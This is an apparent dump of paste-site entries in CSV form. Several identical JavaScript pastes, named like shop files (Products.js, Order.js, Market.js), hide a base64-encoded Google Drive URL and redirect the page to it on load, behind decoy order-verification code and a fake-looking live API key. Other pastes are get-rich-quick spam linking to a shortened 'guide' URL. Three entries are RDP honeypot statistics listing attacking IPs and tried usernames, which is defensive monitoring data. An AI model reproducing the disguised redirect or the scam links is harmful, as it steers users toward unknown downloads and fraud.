id,title,username,language,date,content
3SeJGBrC,Products.js,WassupDog45,JavaScript,Thursday 10th of April 2025 07:21:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45063/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MqJgLwWB,2025-04-10_stats.json,rdp_snitch,JSON,Thursday 10th of April 2025 07:18:34 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 37950,
    ""150.95.30.49"": 15723,
    ""106.14.144.233"": 426,
    ""45.156.128.81"": 18,
    ""194.165.16.167"": 6,
    ""91.238.181.92"": 6,
    ""159.89.6.147"": 1440,
    ""92.255.85.92"": 6,
    ""198.235.24.65"": 9,
    ""157.245.104.150"": 3,
    ""62.60.188.24"": 6,
    ""68.183.179.179"": 483,
    ""103.97.93.115"": 18,
    ""205.210.31.64"": 9,
    ""58.218.199.219"": 15,
    ""80.66.79.30"": 288,
    ""45.227.254.132"": 9,
    ""198.235.24.124"": 9,
    ""178.128.98.159"": 288,
    ""152.32.198.210"": 3,
    ""194.165.16.165"": 6,
    ""118.194.248.4"": 3,
    ""88.214.25.125"": 6,
    ""42.96.5.120"": 3,
    ""198.235.24.44"": 9,
    ""167.94.138.197"": 3
  },
  ""asn"": {
    ""AS60068"": 37950,
    ""AS135161"": 15723,
    ""AS37963"": 426,
    ""AS211680"": 18,
    ""AS48721"": 12,
    ""AS49434"": 6,
    ""AS14061"": 2214,
    ""AS207566"": 6,
    ""AS396982"": 36,
    ""AS215930"": 6,
    ""AS134053"": 18,
    ""AS4134"": 15,
    ""AS60602"": 288,
    ""AS267784"": 9,
    ""AS135377"": 6,
    ""AS35042"": 6,
    ""AS135967"": 3,
    ""AS398324"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 37950,
    ""GMO-Z.COM PTE. LTD."": 15723,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""NSEC - Sistemas Informaticos, S.A."": 18,
    ""Flyservers S.A."": 21,
    ""Datacenter location PAR1 France"": 6,
    ""DigitalOcean, LLC"": 2214,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Google LLC"": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""Chinanet"": 15,
    ""HYPER-HOSTING"": 288,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 37950,
    ""Zcom Thai"": 15723,
    ""Aliyun Computing Co., LTD"": 426,
    ""Inap AMS"": 18,
    ""Flyservers S.A"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""DigitalOcean, LLC"": 1926,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""Chinanet JS"": 15,
    ""Hyper Hosting SRL"": 288,
    ""Xwin Universal LTD"": 9,
    ""Digitalocean"": 288,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Ucloud Information Technology"": 3,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Censys, Inc"": 3
  },
  ""regionName"": {
    ""North West"": 37950,
    ""Bangkok"": 15723,
    ""Shanghai"": 426,
    ""North Holland"": 18,
    ""Kaunas"": 12,
    ""\u00cele-de-France"": 6,
    ""Hesse"": 1440,
    ""Moscow"": 6,
    ""California"": 36,
    ""Karnataka"": 3,
    ""Tehran"": 6,
    ""South West"": 771,
    ""Goa"": 18,
    ""Jiangsu"": 15,
    ""Chi\u0219in\u0103u Municipality"": 288,
    ""Vilnius"": 9,
    ""England"": 3,
    ""Seoul"": 3,
    ""Kowloon City"": 6,
    ""Ninh B\u00ecnh Province"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""Singapore"": 38721,
    ""Thailand"": 15723,
    ""China"": 441,
    ""The Netherlands"": 18,
    ""Lithuania"": 21,
    ""France"": 6,
    ""Germany"": 1440,
    ""Russia"": 6,
    ""United States"": 39,
    ""India"": 21,
    ""Iran"": 6,
    ""Moldova"": 288,
    ""United Kingdom"": 3,
    ""South Korea"": 3,
    ""Hong Kong"": 6,
    ""Vietnam"": 3
  },
  ""account"": {
    ""hello"": 56640,
    ""root"": 18,
    ""Test"": 30,
    ""zSCdDLSbZ"": 3,
    ""LELAHv"": 3,
    ""xbwkyr"": 3,
    ""pwKvdUkzE"": 3,
    ""KfuJpr"": 3,
    ""mcdEUt"": 3,
    ""Domain"": 9,
    ""yGZehTPig"": 3,
    ""TDYeOH"": 3,
    ""tDDRoc"": 3,
    ""Administrator"": 6,
    ""(empty)"": 6,
    ""mdTDPyiAf"": 3,
    ""mrusIT"": 3,
    ""btIOmt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 56745
  },
  ""client_build"": {
    ""Unknown"": 56745
  },
  ""client_name"": {
    ""Unknown"": 56745
  },
  ""ip_type"": {
    ""hosting & proxy"": 38379,
    ""hosting"": 18270,
    ""proxy"": 39,
    ""Unknown"": 57
  }
}"
GNGZ7hEe,2025-04-10_stats.json,rdp_snitch,JSON,Thursday 10th of April 2025 07:16:23 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 25300,
    ""150.95.30.49"": 10482,
    ""106.14.144.233"": 284,
    ""45.156.128.81"": 12,
    ""194.165.16.167"": 4,
    ""91.238.181.92"": 4,
    ""159.89.6.147"": 960,
    ""92.255.85.92"": 4,
    ""198.235.24.65"": 6,
    ""157.245.104.150"": 2,
    ""62.60.188.24"": 4,
    ""68.183.179.179"": 322,
    ""103.97.93.115"": 12,
    ""205.210.31.64"": 6,
    ""58.218.199.219"": 10,
    ""80.66.79.30"": 192,
    ""45.227.254.132"": 6,
    ""198.235.24.124"": 6,
    ""178.128.98.159"": 192,
    ""152.32.198.210"": 2,
    ""194.165.16.165"": 4,
    ""118.194.248.4"": 2,
    ""88.214.25.125"": 4,
    ""42.96.5.120"": 2,
    ""198.235.24.44"": 6,
    ""167.94.138.197"": 2
  },
  ""asn"": {
    ""AS60068"": 25300,
    ""AS135161"": 10482,
    ""AS37963"": 284,
    ""AS211680"": 12,
    ""AS48721"": 8,
    ""AS49434"": 4,
    ""AS14061"": 1476,
    ""AS207566"": 4,
    ""AS396982"": 24,
    ""AS215930"": 4,
    ""AS134053"": 12,
    ""AS4134"": 10,
    ""AS60602"": 192,
    ""AS267784"": 6,
    ""AS135377"": 4,
    ""AS35042"": 4,
    ""AS135967"": 2,
    ""AS398324"": 2
  },
  ""isp"": {
    ""DataCamp Limited"": 25300,
    ""GMO-Z.COM PTE. LTD."": 10482,
    ""Hangzhou Alibaba Advertising Co"": 284,
    ""NSEC - Sistemas Informaticos, S.A."": 12,
    ""Flyservers S.A."": 14,
    ""Datacenter location PAR1 France"": 4,
    ""DigitalOcean, LLC"": 1476,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Google LLC"": 24,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""Ethernet Xpress Pvt. Ltd."": 12,
    ""Chinanet"": 10,
    ""HYPER-HOSTING"": 192,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Bach Kim Network solutions Join stock company"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""Cdn77 SGP"": 25300,
    ""Zcom Thai"": 10482,
    ""Aliyun Computing Co., LTD"": 284,
    ""Inap AMS"": 12,
    ""Flyservers S.A"": 8,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""DigitalOcean, LLC"": 1284,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""UAB Host Baltic"": 4,
    ""Ethernet Xpress Pvt. Ltd."": 12,
    ""Chinanet JS"": 10,
    ""Hyper Hosting SRL"": 192,
    ""Xwin Universal LTD"": 6,
    ""Digitalocean"": 192,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Ucloud Information Technology"": 2,
    ""Bach Kim Network solutions Join stock company"": 2,
    ""Censys, Inc"": 2
  },
  ""regionName"": {
    ""North West"": 25300,
    ""Bangkok"": 10482,
    ""Shanghai"": 284,
    ""North Holland"": 12,
    ""Kaunas"": 8,
    ""\u00cele-de-France"": 4,
    ""Hesse"": 960,
    ""Moscow"": 4,
    ""California"": 24,
    ""Karnataka"": 2,
    ""Tehran"": 4,
    ""South West"": 514,
    ""Goa"": 12,
    ""Jiangsu"": 10,
    ""Chi\u0219in\u0103u Municipality"": 192,
    ""Vilnius"": 6,
    ""England"": 2,
    ""Seoul"": 2,
    ""Kowloon City"": 4,
    ""Ninh B\u00ecnh Province"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""Singapore"": 25814,
    ""Thailand"": 10482,
    ""China"": 294,
    ""The Netherlands"": 12,
    ""Lithuania"": 14,
    ""France"": 4,
    ""Germany"": 960,
    ""Russia"": 4,
    ""United States"": 26,
    ""India"": 14,
    ""Iran"": 4,
    ""Moldova"": 192,
    ""United Kingdom"": 2,
    ""South Korea"": 2,
    ""Hong Kong"": 4,
    ""Vietnam"": 2
  },
  ""account"": {
    ""hello"": 37760,
    ""root"": 12,
    ""Test"": 20,
    ""zSCdDLSbZ"": 2,
    ""LELAHv"": 2,
    ""xbwkyr"": 2,
    ""pwKvdUkzE"": 2,
    ""KfuJpr"": 2,
    ""mcdEUt"": 2,
    ""Domain"": 6,
    ""yGZehTPig"": 2,
    ""TDYeOH"": 2,
    ""tDDRoc"": 2,
    ""Administrator"": 4,
    ""(empty)"": 4,
    ""mdTDPyiAf"": 2,
    ""mrusIT"": 2,
    ""btIOmt"": 2
  },
  ""keyboard"": {
    ""Unknown"": 37830
  },
  ""client_build"": {
    ""Unknown"": 37830
  },
  ""client_name"": {
    ""Unknown"": 37830
  },
  ""ip_type"": {
    ""hosting & proxy"": 25586,
    ""hosting"": 12180,
    ""proxy"": 26,
    ""Unknown"": 38
  }
}"
kMTy9kGF,2025-04-10_stats.json,rdp_snitch,JSON,Thursday 10th of April 2025 07:15:11 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 12650,
    ""150.95.30.49"": 5241,
    ""106.14.144.233"": 142,
    ""45.156.128.81"": 6,
    ""194.165.16.167"": 2,
    ""91.238.181.92"": 2,
    ""159.89.6.147"": 480,
    ""92.255.85.92"": 2,
    ""198.235.24.65"": 3,
    ""157.245.104.150"": 1,
    ""62.60.188.24"": 2,
    ""68.183.179.179"": 161,
    ""103.97.93.115"": 6,
    ""205.210.31.64"": 3,
    ""58.218.199.219"": 5,
    ""80.66.79.30"": 96,
    ""45.227.254.132"": 3,
    ""198.235.24.124"": 3,
    ""178.128.98.159"": 96,
    ""152.32.198.210"": 1,
    ""194.165.16.165"": 2,
    ""118.194.248.4"": 1,
    ""88.214.25.125"": 2,
    ""42.96.5.120"": 1,
    ""198.235.24.44"": 3,
    ""167.94.138.197"": 1
  },
  ""asn"": {
    ""AS60068"": 12650,
    ""AS135161"": 5241,
    ""AS37963"": 142,
    ""AS211680"": 6,
    ""AS48721"": 4,
    ""AS49434"": 2,
    ""AS14061"": 738,
    ""AS207566"": 2,
    ""AS396982"": 12,
    ""AS215930"": 2,
    ""AS134053"": 6,
    ""AS4134"": 5,
    ""AS60602"": 96,
    ""AS267784"": 3,
    ""AS135377"": 2,
    ""AS35042"": 2,
    ""AS135967"": 1,
    ""AS398324"": 1
  },
  ""isp"": {
    ""DataCamp Limited"": 12650,
    ""GMO-Z.COM PTE. LTD."": 5241,
    ""Hangzhou Alibaba Advertising Co"": 142,
    ""NSEC - Sistemas Informaticos, S.A."": 6,
    ""Flyservers S.A."": 7,
    ""Datacenter location PAR1 France"": 2,
    ""DigitalOcean, LLC"": 738,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Google LLC"": 12,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 6,
    ""Chinanet"": 5,
    ""HYPER-HOSTING"": 96,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Bach Kim Network solutions Join stock company"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""Cdn77 SGP"": 12650,
    ""Zcom Thai"": 5241,
    ""Aliyun Computing Co., LTD"": 142,
    ""Inap AMS"": 6,
    ""Flyservers S.A"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""DigitalOcean, LLC"": 642,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""UAB Host Baltic"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 6,
    ""Chinanet JS"": 5,
    ""Hyper Hosting SRL"": 96,
    ""Xwin Universal LTD"": 3,
    ""Digitalocean"": 96,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Ucloud Information Technology"": 1,
    ""Bach Kim Network solutions Join stock company"": 1,
    ""Censys, Inc"": 1
  },
  ""regionName"": {
    ""North West"": 12650,
    ""Bangkok"": 5241,
    ""Shanghai"": 142,
    ""North Holland"": 6,
    ""Kaunas"": 4,
    ""\u00cele-de-France"": 2,
    ""Hesse"": 480,
    ""Moscow"": 2,
    ""California"": 12,
    ""Karnataka"": 1,
    ""Tehran"": 2,
    ""South West"": 257,
    ""Goa"": 6,
    ""Jiangsu"": 5,
    ""Chi\u0219in\u0103u Municipality"": 96,
    ""Vilnius"": 3,
    ""England"": 1,
    ""Seoul"": 1,
    ""Kowloon City"": 2,
    ""Ninh B\u00ecnh Province"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""Singapore"": 12907,
    ""Thailand"": 5241,
    ""China"": 147,
    ""The Netherlands"": 6,
    ""Lithuania"": 7,
    ""France"": 2,
    ""Germany"": 480,
    ""Russia"": 2,
    ""United States"": 13,
    ""India"": 7,
    ""Iran"": 2,
    ""Moldova"": 96,
    ""United Kingdom"": 1,
    ""South Korea"": 1,
    ""Hong Kong"": 2,
    ""Vietnam"": 1
  },
  ""account"": {
    ""hello"": 18880,
    ""root"": 6,
    ""Test"": 10,
    ""zSCdDLSbZ"": 1,
    ""LELAHv"": 1,
    ""xbwkyr"": 1,
    ""pwKvdUkzE"": 1,
    ""KfuJpr"": 1,
    ""mcdEUt"": 1,
    ""Domain"": 3,
    ""yGZehTPig"": 1,
    ""TDYeOH"": 1,
    ""tDDRoc"": 1,
    ""Administrator"": 2,
    ""(empty)"": 2,
    ""mdTDPyiAf"": 1,
    ""mrusIT"": 1,
    ""btIOmt"": 1
  },
  ""keyboard"": {
    ""Unknown"": 18915
  },
  ""client_build"": {
    ""Unknown"": 18915
  },
  ""client_name"": {
    ""Unknown"": 18915
  },
  ""ip_type"": {
    ""hosting & proxy"": 12793,
    ""hosting"": 6090,
    ""proxy"": 13,
    ""Unknown"": 19
  }
}"
fKsYhS2V,EARN $900 INSTANTLY 2025 2U,poopface455,JavaScript,Thursday 10th of April 2025 07:09:43 PM CDT," 
Pdf https://tinyurl.com/privguidee


GTHgx5GrF5
"
mJvc8nN7,Order.js,WassupDog45,JavaScript,Thursday 10th of April 2025 07:05:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53734/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KjbL5s9f,Make $1000 15-MINUTES (BEGINNER) FM,poopface455,JavaScript,Thursday 10th of April 2025 06:56:20 PM CDT," 
Pdf https://tinyurl.com/privguidee


CgC2EXXpc1
"
VrpR6hUG,Market.js,WassupDog45,JavaScript,Thursday 10th of April 2025 06:50:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24512/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f4mYjbLs,EARN $900 INSTANTLY 2025⭐ G8,poopface455,JavaScript,Thursday 10th of April 2025 06:42:56 PM CDT," 
Pdf https://tinyurl.com/privguidee


gQbC1NxL2Z
"
JQudCfnB,Untitled,WassupDog45,JavaScript,Thursday 10th of April 2025 06:35:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10084/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
